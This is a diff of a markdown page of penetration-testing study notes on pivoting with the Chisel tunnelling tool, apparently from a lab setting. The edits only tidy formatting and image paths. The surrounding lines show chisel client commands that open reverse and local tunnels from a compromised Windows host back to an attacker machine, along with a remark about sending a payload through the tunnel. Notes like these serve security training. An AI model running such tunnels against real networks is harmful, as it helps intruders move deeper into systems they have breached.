@@ -1,6 +1,6 @@
 # Pivoting with Chisel
 
-## Reverse Pivot&#x20;
+## Reverse Pivot
 
 (sends traffic back to kali via tunnel)
 
@@ -24,9 +24,9 @@ On intermediate target:
 C:\Users\offsec\Documents>chisel.exe client 192.168.119.163:8000 R:8001:172.16.163.5:80
 ```
 
-![](<../../.gitbook/assets/Reverse Pivot Step 1.png>) ![](<../../.gitbook/assets/Reverse Pivot Step 2.png>)
+![](</assets/images/Reverse_Pivot_1.png>) ![](</assets/images/Reverse_Pivot_2.png>)
 
-## Local Pivot&#x20;
+## Local Pivot
 
 (sends traffic to client and then back to kali)
 
@@ -52,4 +52,4 @@ C:\Users\offsec\Documents>chisel.exe client 192.168.119.163:8000 9001:127.0.0.1:
 
 On Remote host execute payload with IP of client and it will get forwarded to attack box
 
-![](<../../.gitbook/assets/Local Pivot Step 1.png>)![](<../../.gitbook/assets/Local Pivot Step 2.png>)![](<../../.gitbook/assets/Local Pivot Step 3.png>)
+![](</assets/images/Local_Pivot_1.png>)![](</assets/images/Local_Pivot_2.png>)![](</assets/images/Local_Pivot_3.png>)
